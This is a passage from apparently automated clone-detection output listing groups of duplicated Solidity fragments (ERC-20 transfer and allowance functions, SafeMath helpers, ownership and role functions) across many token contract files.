    allowed[msg.sender][spender] = allowed[msg.sender][spender].sub(subtractedValue);
    emit Approval(msg.sender, spender, allowed[msg.sender][spender]);
    return true;
  }
</source>
<source file="systems/source-code/0xe075edd828ad35d7288e57d329fe84adf8763ba8.sol" startline="91" endline="96" pcid="8062">
  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    require(spender != address(0));
    allowed[msg.sender][spender] = allowed[msg.sender][spender].add(addedValue);
    emit Approval(msg.sender, spender, allowed[msg.sender][spender]);
    return true;
  }
</source>
<source file="systems/source-code/0xe075edd828ad35d7288e57d329fe84adf8763ba8.sol" startline="98" endline="103" pcid="8063">
  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    require(spender != address(0));
    allowed[msg.sender][spender] = allowed[msg.sender][spender].sub(subtractedValue);
    emit Approval(msg.sender, spender, allowed[msg.sender][spender]);
    return true;
  }
</source>
<source file="systems/source-code/0xecdfc4259c9C74337768b0d804C442a67B36a761.sol" startline="326" endline="332" pcid="8641">
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        require(spender != address(0));
        allowed[msg.sender][spender] = (allowed[msg.sender][spender].add(addedValue));

        emit Approval(msg.sender, spender, allowed[msg.sender][spender]);
        return true;
    }
</source>
<source file="systems/source-code/0xecdfc4259c9C74337768b0d804C442a67B36a761.sol" startline="334" endline="340" pcid="8642">
    function decreaseAllowance( address spender, uint256 subtractedValue) public returns (bool) {
        require(spender != address(0));
        allowed[msg.sender][spender] = (allowed[msg.sender][spender].sub(subtractedValue));

        emit Approval(msg.sender, spender, allowed[msg.sender][spender]);
        return true;
    }
</source>
<source file="systems/source-code/0xf53366b7eb8a67d2e1f41b0fc8619e082cd06666.sol" startline="90" endline="95" pcid="8977">
  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    require(spender != address(0));
    allowed[msg.sender][spender] = allowed[msg.sender][spender].add(addedValue);
    emit Approval(msg.sender, spender, allowed[msg.sender][spender]);
    return true;
  }
</source>
</class>

<class classid="124" nclones="4" nlines="4" similarity="100">
<source file="systems/source-code/0x23e0b74aE3EC9f9B37AE2b13024Cc089e777E865.sol" startline="172" endline="175" pcid="1086">
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        return a - b;
    }
</source>
<source file="systems/source-code/0xe075edd828ad35d7288e57d329fe84adf8763ba8.sol" startline="122" endline="125" pcid="8066">
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b <= a);
    return a - b;
  }
</source>
<source file="systems/source-code/0xf53366b7eb8a67d2e1f41b0fc8619e082cd06666.sol" startline="121" endline="124" pcid="8981">
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b <= a);
    return a - b;
  }
</source>
<source file="systems/source-code/0xc601f3c40a8DE1f872AE056e7e21E255E740741A.sol" startline="142" endline="145" pcid="7125">
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b <= a);
    return a - b;
  }
</source>
</class>

<class classid="125" nclones="4" nlines="5" similarity="100">
<source file="systems/source-code/0x23e0b74aE3EC9f9B37AE2b13024Cc089e777E865.sol" startline="183" endline="187" pcid="1088">
    function ceil(uint256 a, uint256 m) internal pure returns (uint256) {
        uint256 c = add(a, m);
        uint256 d = sub(c, 1);
        return mul(div(d, m), m);
    }
</source>
<source file="systems/source-code/0xc601f3c40a8DE1f872AE056e7e21E255E740741A.sol" startline="153" endline="157" pcid="7127">
  function ceil(uint256 a, uint256 m) internal pure returns (uint256) {
    uint256 c = add(a,m);
    uint256 d = sub(c,1);
    return mul(div(d,m),m);
  }
</source>
<source file="systems/source-code/0xe075edd828ad35d7288e57d329fe84adf8763ba8.sol" startline="133" endline="137" pcid="8068">
  function ceil(uint256 a, uint256 m) internal pure returns (uint256) {
    uint256 c = add(a,m);
    uint256 d = sub(c,1);
    return mul(div(d,m),m);
  }
</source>
<source file="systems/source-code/0xf53366b7eb8a67d2e1f41b0fc8619e082cd06666.sol" startline="132" endline="136" pcid="8983">
  function ceil(uint256 a, uint256 m) internal pure returns (uint256) {
    uint256 c = add(a,m);
    uint256 d = sub(c,1);
    return mul(div(d,m),m);
  }
</source>
</class>

<class classid="126" nclones="9" nlines="5" similarity="100">
<source file="systems/source-code/0x25247a283047f964638be79886b61af12d3fe568.sol" startline="42" endline="46" pcid="1170">
    function transfer(address recipient, uint256 amount) public returns (bool) {
        require(amount <= balances[msg.sender], "Insufficient balance");
        _transfer(msg.sender, recipient, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xad412ae15b025e6a5a583c66a42d25e10d53cda6.sol" startline="36" endline="40" pcid="6288">
    function transfer(address recipient, uint256 amount) public returns (bool) {
        require(amount <= balances[msg.sender], "Insufficient balance");
        _transfer(msg.sender, recipient, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x7b43aee5ca91412d54b6ee6b35a1708063e210f1.sol" startline="39" endline="43" pcid="4617">
    function transfer(address recipient, uint256 amount) public returns (bool) {
        require(amount <= balances[msg.sender], "Insufficient balance");
        _transfer(msg.sender, recipient, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xf157af38701777fc54f34bf6ccde57bb1c364fae.sol" startline="39" endline="43" pcid="8821">
    function transfer(address recipient, uint256 amount) public returns (bool) {
        require(amount <= balances[msg.sender], "Insufficient balance");
        _transfer(msg.sender, recipient, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xfd0d43a6f56f17d6efe203410a9306a7953885e5.sol" startline="39" endline="43" pcid="9216">
    function transfer(address recipient, uint256 amount) public returns (bool) {
        require(amount <= balances[msg.sender], "Insufficient balance");
        _transfer(msg.sender, recipient, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x42e8ECeca237eA7FA8b4B52F14Ca6C3d3c3213dc.sol" startline="32" endline="36" pcid="2473">
    function transfer(address recipient, uint256 amount) public returns (bool) {
        require(amount <= balances[msg.sender], "Insufficient balance");
        _transfer(msg.sender, recipient, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x44b5f46a20c2981d1bae28c3549365b9c6186931.sol" startline="35" endline="39" pcid="2549">
    function transfer(address recipient, uint256 amount) public returns (bool) {
        require(amount <= balances[msg.sender], "Insufficient balance");
        _transfer(msg.sender, recipient, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x2dae79a98c60696b65d591700dfeb9422ab2735c.sol" startline="41" endline="45" pcid="1351">
    function transfer(address recipient, uint256 amount) public returns (bool) {
        require(amount <= balances[msg.sender], "Insufficient balance");
        _transfer(msg.sender, recipient, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x2d11e3f0a7a3793f2211940d85cd3b48718c5e7a.sol" startline="39" endline="43" pcid="1344">
    function transfer(address recipient, uint256 amount) public returns (bool) {
        require(amount <= balances[msg.sender], "Insufficient balance");
        _transfer(msg.sender, recipient, amount);
        return true;
    }
</source>
</class>

<class classid="127" nclones="9" nlines="7" similarity="100">
<source file="systems/source-code/0x25247a283047f964638be79886b61af12d3fe568.sol" startline="48" endline="54" pcid="1171">
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        require(amount <= balances[sender], "Insufficient balance");
        require(amount <= allowances[sender][msg.sender], "Insufficient allowance");
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, allowances[sender][msg.sender] - amount);
        return true;
    }
</source>
<source file="systems/source-code/0x42e8ECeca237eA7FA8b4B52F14Ca6C3d3c3213dc.sol" startline="38" endline="44" pcid="2474">
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        require(amount <= balances[sender], "Insufficient balance");
        require(amount <= allowances[sender][msg.sender], "Insufficient allowance");
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, allowances[sender][msg.sender] - amount);
        return true;
    }
</source>
<source file="systems/source-code/0xfd0d43a6f56f17d6efe203410a9306a7953885e5.sol" startline="45" endline="51" pcid="9217">
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        require(amount <= balances[sender], "Insufficient balance");
        require(amount <= allowances[sender][msg.sender], "Insufficient allowance");
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, allowances[sender][msg.sender] - amount);
        return true;
    }
</source>
<source file="systems/source-code/0xf157af38701777fc54f34bf6ccde57bb1c364fae.sol" startline="45" endline="51" pcid="8822">
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        require(amount <= balances[sender], "Insufficient balance");
        require(amount <= allowances[sender][msg.sender], "Insufficient allowance");
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, allowances[sender][msg.sender] - amount);
        return true;
    }
</source>
<source file="systems/source-code/0x7b43aee5ca91412d54b6ee6b35a1708063e210f1.sol" startline="45" endline="51" pcid="4618">
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        require(amount <= balances[sender], "Insufficient balance");
        require(amount <= allowances[sender][msg.sender], "Insufficient allowance");
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, allowances[sender][msg.sender] - amount);
        return true;
    }
</source>
<source file="systems/source-code/0x2dae79a98c60696b65d591700dfeb9422ab2735c.sol" startline="47" endline="53" pcid="1352">
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        require(amount <= balances[sender], "Insufficient balance");
        require(amount <= allowances[sender][msg.sender], "Insufficient allowance");
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, allowances[sender][msg.sender] - amount);
        return true;
    }
</source>
<source file="systems/source-code/0x2d11e3f0a7a3793f2211940d85cd3b48718c5e7a.sol" startline="45" endline="51" pcid="1345">
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        require(amount <= balances[sender], "Insufficient balance");
        require(amount <= allowances[sender][msg.sender], "Insufficient allowance");
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, allowances[sender][msg.sender] - amount);
        return true;
    }
</source>
<source file="systems/source-code/0xad412ae15b025e6a5a583c66a42d25e10d53cda6.sol" startline="42" endline="48" pcid="6289">
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        require(amount <= balances[sender], "Insufficient balance");
        require(amount <= allowances[sender][msg.sender], "Insufficient allowance");
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, allowances[sender][msg.sender] - amount);
        return true;
    }
</source>
<source file="systems/source-code/0x44b5f46a20c2981d1bae28c3549365b9c6186931.sol" startline="41" endline="47" pcid="2550">
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        require(amount <= balances[sender], "Insufficient balance");
        require(amount <= allowances[sender][msg.sender], "Insufficient allowance");
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, allowances[sender][msg.sender] - amount);
        return true;
    }
</source>
</class>

<class classid="128" nclones="4" nlines="5" similarity="75">
<source file="systems/source-code/0x276bdaae1e84fb779399844d422d89961b672f3f.sol" startline="19" endline="23" pcid="1229">
    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }
</source>
<source file="systems/source-code/0xa50904cb0ca5824ff012222a39420cb177d5b3ce.sol" startline="55" endline="59" pcid="5988">
  function transferOwnership(address newOwner) public onlyOwner {
    require(newOwner != address(0));
    emit OwnershipTransferred(owner, newOwner);
    owner = newOwner;
  }
</source>
<source file="systems/source-code/0x89deb6c8918a42457bd6ddbcaaf979216c4d774c.sol" startline="53" endline="57" pcid="5119">
  function transferOwnership(address newOwner) public onlyOwner {
    require(newOwner != address(0));
    emit OwnershipTransferred(owner, newOwner);
    owner = newOwner;
  }
</source>
<source file="systems/source-code/0xd2561d1426d48ead5653cb31af52eb7a2bcf95f9.sol" startline="19" endline="23" pcid="7525">
    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }
</source>
</class>

<class classid="129" nclones="2" nlines="7" similarity="100">
<source file="systems/source-code/0x2a0bCbE87f979daE24D480e73eE0C3b688D89b1e.sol" startline="22" endline="28" pcid="1268">
    function transfer(address to, uint value) public returns(bool) {
        require(balanceOf(msg.sender) >= value, 'balance too low');
        balances[to] += value;
        balances[msg.sender] -= value;
       emit Transfer(msg.sender, to, value);
        return true;
    }
</source>
<source file="systems/source-code/0x374e2e0b414f5043e7afefdb7f2be47bcb9e349d.sol" startline="29" endline="35" pcid="1855">
    function transfer(address to, uint value) public  returns(bool) {
        require(balanceOf(msg.sender) >= value, 'balance too low');
        balances[to] += value;
        balances[msg.sender] -= value;
       emit Transfer(msg.sender, to, value);
        return true;
    }
</source>
</class>

<class classid="130" nclones="2" nlines="8" similarity="100">
<source file="systems/source-code/0x2a0bCbE87f979daE24D480e73eE0C3b688D89b1e.sol" startline="30" endline="37" pcid="1269">
    function transferFrom(address from, address to, uint value) public returns(bool) {
        require(balanceOf(from) >= value, 'balance too low');
        require(allowance[from][msg.sender] >= value, 'allowance too low');
        balances[to] += value;
        balances[from] -= value;
        emit Transfer(from, to, value);
        return true;   
    }
</source>
<source file="systems/source-code/0x374e2e0b414f5043e7afefdb7f2be47bcb9e349d.sol" startline="37" endline="44" pcid="1856">
    function transferFrom(address from, address to, uint value) public returns(bool) {
        require(balanceOf(from) >= value, 'balance too low');
        require(allowance[from][msg.sender] >= value, 'allowance too low');
        balances[to] += value;
        balances[from] -= value;
        emit Transfer(from, to, value);
        return true;   
    }
</source>
</class>

<class classid="131" nclones="4" nlines="8" similarity="100">
<source file="systems/source-code/0x2ccAcCb6b900968f85A738B2DFf1Db106ABbB501.sol" startline="16" endline="23" pcid="1317">
    function mul(uint a, uint b) internal pure returns (uint) {
        if (a == 0) {
            return 0;
        }
        uint c = a * b;
        assert(c / a == b);
        return c;
    }
</source>
<source file="systems/source-code/0x71ee7f095E811A3dE31cbea5fB6aBCdC5aFaE9f4.sol" startline="6" endline="13" pcid="4179">
    function mul(uint a, uint b) internal pure returns (uint) {
        if (a == 0) {
            return 0;
        }
        uint c = a * b;
        assert(c / a == b);
        return c;
    }
</source>
<source file="systems/source-code/0x3fdeaec806bd455a7f241a1b33f468b43cb2057b.sol" startline="10" endline="17" pcid="2311">
    function mul(uint a, uint b) internal pure returns (uint) {
        if (a == 0) {
            return 0;
        }
        uint c = a * b;
        assert(c / a == b);
        return c;
    }
</source>
<source file="systems/source-code/0x4396B7E63f562e7Bb603B31d9e9368dA29F9D579.sol" startline="10" endline="17" pcid="2479">
    function mul(uint a, uint b) internal pure returns (uint) {
        if (a == 0) {
            return 0;
        }
        uint c = a * b;
        assert(c / a == b);
        return c;
    }
</source>
</class>

<class classid="132" nclones="4" nlines="4" similarity="100">
<source file="systems/source-code/0x2ccAcCb6b900968f85A738B2DFf1Db106ABbB501.sol" startline="25" endline="30" pcid="1318">
    function div(uint a, uint b) internal pure returns (uint) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }
</source>
<source file="systems/source-code/0x71ee7f095E811A3dE31cbea5fB6aBCdC5aFaE9f4.sol" startline="15" endline="20" pcid="4180">
    function div(uint a, uint b) internal pure returns (uint) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }
</source>
<source file="systems/source-code/0x4396B7E63f562e7Bb603B31d9e9368dA29F9D579.sol" startline="19" endline="24" pcid="2480">
    function div(uint a, uint b) internal pure returns (uint) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }
</source>
<source file="systems/source-code/0x3fdeaec806bd455a7f241a1b33f468b43cb2057b.sol" startline="19" endline="24" pcid="2312">
    function div(uint a, uint b) internal pure returns (uint) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }
</source>
</class>

<class classid="133" nclones="5" nlines="4" similarity="100">
<source file="systems/source-code/0x2ccAcCb6b900968f85A738B2DFf1Db106ABbB501.sol" startline="32" endline="35" pcid="1319">
    function sub(uint a, uint b) internal pure returns (uint) {
        assert(b <= a);
        return a - b;
    }
</source>
<source file="systems/source-code/0x3ca260383F7b05C49Aaf72906e8Ec1Da4Bb1CdC6.sol" startline="36" endline="39" pcid="2160">
    function minus(uint a, uint b) public pure returns (uint) {
        assert(b <= a);
        return a - b;
    }
</source>
<source file="systems/source-code/0x4396B7E63f562e7Bb603B31d9e9368dA29F9D579.sol" startline="26" endline="29" pcid="2481">
    function sub(uint a, uint b) internal pure returns (uint) {
        assert(b <= a);
        return a - b;
    }
</source>
<source file="systems/source-code/0x71ee7f095E811A3dE31cbea5fB6aBCdC5aFaE9f4.sol" startline="22" endline="25" pcid="4181">
    function sub(uint a, uint b) internal pure returns (uint) {
        assert(b <= a);
        return a - b;
    }
</source>
<source file="systems/source-code/0x3fdeaec806bd455a7f241a1b33f468b43cb2057b.sol" startline="26" endline="29" pcid="2313">
    function sub(uint a, uint b) internal pure returns (uint) {
        assert(b <= a);
        return a - b;
    }
</source>
</class>

<class classid="134" nclones="5" nlines="5" similarity="100">
<source file="systems/source-code/0x2ccAcCb6b900968f85A738B2DFf1Db106ABbB501.sol" startline="37" endline="41" pcid="1320">
    function add(uint a, uint b) internal pure returns (uint) {
        uint c = a + b;
        assert(c >= a);
        return c;
    }
</source>
<source file="systems/source-code/0x4396B7E63f562e7Bb603B31d9e9368dA29F9D579.sol" startline="31" endline="35" pcid="2482">
    function add(uint a, uint b) internal pure returns (uint) {
        uint c = a + b;
        assert(c >= a);
        return c;
    }
</source>
<source file="systems/source-code/0x3ca260383F7b05C49Aaf72906e8Ec1Da4Bb1CdC6.sol" startline="41" endline="45" pcid="2161">
    function plus(uint a, uint b) public pure returns (uint) {
        uint c = a + b;
        assert(c >= a);
        return c;
    }
</source>
<source file="systems/source-code/0x3fdeaec806bd455a7f241a1b33f468b43cb2057b.sol" startline="31" endline="35" pcid="2314">
    function add(uint a, uint b) internal pure returns (uint) {
        uint c = a + b;
        assert(c >= a);
        return c;
    }
</source>
<source file="systems/source-code/0x71ee7f095E811A3dE31cbea5fB6aBCdC5aFaE9f4.sol" startline="27" endline="31" pcid="4182">
    function add(uint a, uint b) internal pure returns (uint) {
        uint c = a + b;
        assert(c >= a);
        return c;
    }
</source>
</class>

<class classid="135" nclones="4" nlines="4" similarity="100">
<source file="systems/source-code/0x2ccAcCb6b900968f85A738B2DFf1Db106ABbB501.sol" startline="45" endline="49" pcid="1321">
    function safeApprove(address token, address to, uint value) internal {
        // bytes4(keccak256(bytes('approve(address,uint256)')));
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x095ea7b3, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: APPROVE_FAILED');
    }
</source>
<source file="systems/source-code/0x3fdeaec806bd455a7f241a1b33f468b43cb2057b.sol" startline="48" endline="52" pcid="2315">
    function safeApprove(address token, address to, uint value) internal {
        // bytes4(keccak256(bytes('approve(address,uint256)')));
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x095ea7b3, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: APPROVE_FAILED');
    }
</source>
<source file="systems/source-code/0x4396B7E63f562e7Bb603B31d9e9368dA29F9D579.sol" startline="48" endline="52" pcid="2483">
    function safeApprove(address token, address to, uint value) internal {
        // bytes4(keccak256(bytes('approve(address,uint256)')));
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x095ea7b3, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: APPROVE_FAILED');
    }
</source>
<source file="systems/source-code/0x71ee7f095E811A3dE31cbea5fB6aBCdC5aFaE9f4.sol" startline="44" endline="48" pcid="4183">
    function safeApprove(address token, address to, uint value) internal {
        // bytes4(keccak256(bytes('approve(address,uint256)')));
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x095ea7b3, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: APPROVE_FAILED');
    }
</source>
</class>

<class classid="136" nclones="4" nlines="4" similarity="100">
<source file="systems/source-code/0x2ccAcCb6b900968f85A738B2DFf1Db106ABbB501.sol" startline="51" endline="55" pcid="1322">
    function safeTransfer(address token, address to, uint value) internal {
        // bytes4(keccak256(bytes('transfer(address,uint256)')));
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0xa9059cbb, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: TRANSFER_FAILED');
    }
</source>
<source file="systems/source-code/0x4396B7E63f562e7Bb603B31d9e9368dA29F9D579.sol" startline="54" endline="58" pcid="2484">
    function safeTransfer(address token, address to, uint value) internal {
        // bytes4(keccak256(bytes('transfer(address,uint256)')));
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0xa9059cbb, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: TRANSFER_FAILED');
    }
</source>
<source file="systems/source-code/0x71ee7f095E811A3dE31cbea5fB6aBCdC5aFaE9f4.sol" startline="50" endline="54" pcid="4184">
    function safeTransfer(address token, address to, uint value) internal {
        // bytes4(keccak256(bytes('transfer(address,uint256)')));
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0xa9059cbb, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: TRANSFER_FAILED');
    }
</source>
<source file="systems/source-code/0x3fdeaec806bd455a7f241a1b33f468b43cb2057b.sol" startline="54" endline="58" pcid="2316">
    function safeTransfer(address token, address to, uint value) internal {
        // bytes4(keccak256(bytes('transfer(address,uint256)')));
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0xa9059cbb, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: TRANSFER_FAILED');
    }
</source>
</class>

<class classid="137" nclones="4" nlines="4" similarity="100">
<source file="systems/source-code/0x2ccAcCb6b900968f85A738B2DFf1Db106ABbB501.sol" startline="57" endline="61" pcid="1323">
    function safeTransferFrom(address token, address from, address to, uint value) internal {
        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x23b872dd, from, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: TRANSFER_FROM_FAILED');
    }
</source>
<source file="systems/source-code/0x4396B7E63f562e7Bb603B31d9e9368dA29F9D579.sol" startline="60" endline="64" pcid="2485">
    function safeTransferFrom(address token, address from, address to, uint value) internal {
        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x23b872dd, from, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: TRANSFER_FROM_FAILED');
    }
</source>
<source file="systems/source-code/0x71ee7f095E811A3dE31cbea5fB6aBCdC5aFaE9f4.sol" startline="56" endline="60" pcid="4185">
    function safeTransferFrom(address token, address from, address to, uint value) internal {
        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x23b872dd, from, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: TRANSFER_FROM_FAILED');
    }
</source>
<source file="systems/source-code/0x3fdeaec806bd455a7f241a1b33f468b43cb2057b.sol" startline="60" endline="64" pcid="2317">
    function safeTransferFrom(address token, address from, address to, uint value) internal {
        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x23b872dd, from, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: TRANSFER_FROM_FAILED');
    }
</source>
</class>

<class classid="138" nclones="4" nlines="4" similarity="100">
<source file="systems/source-code/0x2ccAcCb6b900968f85A738B2DFf1Db106ABbB501.sol" startline="63" endline="66" pcid="1324">
    function safeTransferETH(address to, uint value) internal {
        (bool success,) = to.call.value(value)(new bytes(0));
        require(success, 'TransferHelper: ETH_TRANSFER_FAILED');
    }
</source>
<source file="systems/source-code/0x3fdeaec806bd455a7f241a1b33f468b43cb2057b.sol" startline="66" endline="69" pcid="2318">
    function safeTransferETH(address to, uint value) internal {
        (bool success,) = to.call.value(value)(new bytes(0));
        require(success, 'TransferHelper: ETH_TRANSFER_FAILED');
    }
</source>
<source file="systems/source-code/0x4396B7E63f562e7Bb603B31d9e9368dA29F9D579.sol" startline="66" endline="69" pcid="2486">
    function safeTransferETH(address to, uint value) internal {
        (bool success,) = to.call.value(value)(new bytes(0));
        require(success, 'TransferHelper: ETH_TRANSFER_FAILED');
    }
</source>
<source file="systems/source-code/0x71ee7f095E811A3dE31cbea5fB6aBCdC5aFaE9f4.sol" startline="62" endline="65" pcid="4186">
    function safeTransferETH(address to, uint value) internal {
        (bool success,) = to.call.value(value)(new bytes(0));
        require(success, 'TransferHelper: ETH_TRANSFER_FAILED');
    }
</source>
</class>

<class classid="139" nclones="4" nlines="3" similarity="100">
<source file="systems/source-code/0x2ccAcCb6b900968f85A738B2DFf1Db106ABbB501.sol" startline="122" endline="124" pcid="1325">
    function renounceOwnership() public onlyOwner {
        owner = address(0);
    }
</source>
<source file="systems/source-code/0x4396B7E63f562e7Bb603B31d9e9368dA29F9D579.sol" startline="124" endline="126" pcid="2487">
    function renounceOwnership() public onlyOwner {
        owner = address(0);
    }
</source>
<source file="systems/source-code/0x71ee7f095E811A3dE31cbea5fB6aBCdC5aFaE9f4.sol" startline="115" endline="117" pcid="4187">
    function renounceOwnership() public onlyOwner {
        owner = address(0);
    }
</source>
<source file="systems/source-code/0x3fdeaec806bd455a7f241a1b33f468b43cb2057b.sol" startline="124" endline="126" pcid="2319">
    function renounceOwnership() public onlyOwner {
        owner = address(0);
    }
</source>
</class>

<class classid="140" nclones="4" nlines="3" similarity="100">
<source file="systems/source-code/0x2ccAcCb6b900968f85A738B2DFf1Db106ABbB501.sol" startline="139" endline="141" pcid="1326">
    function assignRole (address _entity, bytes32 _role) public hasRole(SUPER_ADMIN) {
        roles[_entity][_role] = true;
    }
</source>
<source file="systems/source-code/0x3fdeaec806bd455a7f241a1b33f468b43cb2057b.sol" startline="141" endline="143" pcid="2320">
    function assignRole (address _entity, bytes32 _role) public hasRole(SUPER_ADMIN) {
        roles[_entity][_role] = true;
    }
</source>
<source file="systems/source-code/0x71ee7f095E811A3dE31cbea5fB6aBCdC5aFaE9f4.sol" startline="132" endline="134" pcid="4188">
    function assignRole (address _entity, bytes32 _role) public hasRole(SUPER_ADMIN) {
        roles[_entity][_role] = true;
    }
</source>
<source file="systems/source-code/0x4396B7E63f562e7Bb603B31d9e9368dA29F9D579.sol" startline="141" endline="143" pcid="2488">
    function assignRole (address _entity, bytes32 _role) public hasRole(SUPER_ADMIN) {
        roles[_entity][_role] = true;
    }
</source>
</class>

<class classid="141" nclones="4" nlines="3" similarity="100">
<source file="systems/source-code/0x2ccAcCb6b900968f85A738B2DFf1Db106ABbB501.sol" startline="143" endline="145" pcid="1327">
    function unassignRole (address _entity, bytes32 _role) public hasRole(SUPER_ADMIN) {
        roles[_entity][_role] = false;
    }
</source>
<source file="systems/source-code/0x4396B7E63f562e7Bb603B31d9e9368dA29F9D579.sol" startline="145" endline="147" pcid="2489">
    function unassignRole (address _entity, bytes32 _role) public hasRole(SUPER_ADMIN) {
        roles[_entity][_role] = false;
    }
</source>
<source file="systems/source-code/0x3fdeaec806bd455a7f241a1b33f468b43cb2057b.sol" startline="145" endline="147" pcid="2321">
    function unassignRole (address _entity, bytes32 _role) public hasRole(SUPER_ADMIN) {
        roles[_entity][_role] = false;
    }
</source>
<source file="systems/source-code/0x71ee7f095E811A3dE31cbea5fB6aBCdC5aFaE9f4.sol" startline="136" endline="138" pcid="4189">
    function unassignRole (address _entity, bytes32 _role) public hasRole(SUPER_ADMIN) {
        roles[_entity][_role] = false;
    }
</source>
</class>

<class classid="142" nclones="4" nlines="3" similarity="100">
<source file="systems/source-code/0x2ccAcCb6b900968f85A738B2DFf1Db106ABbB501.sol" startline="147" endline="149" pcid="1328">
    function isAssignedRole (address _entity, bytes32 _role) public view returns (bool) {
        return roles[_entity][_role];
    }
</source>
<source file="systems/source-code/0x3fdeaec806bd455a7f241a1b33f468b43cb2057b.sol" startline="149" endline="151" pcid="2322">
    function isAssignedRole (address _entity, bytes32 _role) public view returns (bool) {
        return roles[_entity][_role];
    }
</source>
<source file="systems/source-code/0x4396B7E63f562e7Bb603B31d9e9368dA29F9D579.sol" startline="149" endline="151" pcid="2490">
    function isAssignedRole (address _entity, bytes32 _role) public view returns (bool) {
        return roles[_entity][_role];
    }
</source>
<source file="systems/source-code/0x71ee7f095E811A3dE31cbea5fB6aBCdC5aFaE9f4.sol" startline="140" endline="142" pcid="4190">
    function isAssignedRole (address _entity, bytes32 _role) public view returns (bool) {
        return roles[_entity][_role];
    }
</source>
</class>

<class classid="143" nclones="8" nlines="3" similarity="100">
<source file="systems/source-code/0x2ccAcCb6b900968f85A738B2DFf1Db106ABbB501.sol" startline="234" endline="236" pcid="1334">
    function transfer(address _to, uint _value) public returns (bool) {
        return super.transfer(_to, _value);
    }
</source>
<source file="systems/source-code/0x2ccAcCb6b900968f85A738B2DFf1Db106ABbB501.sol" startline="242" endline="244" pcid="1336">
    function approve(address _spender, uint _value) public returns (bool) {
        return super.approve(_spender, _value);
    }
</source>
<source file="systems/source-code/0x3fdeaec806bd455a7f241a1b33f468b43cb2057b.sol" startline="247" endline="249" pcid="2330">
    function approve(address _spender, uint _value) public returns (bool) {
        return super.approve(_spender, _value);
    }
</source>
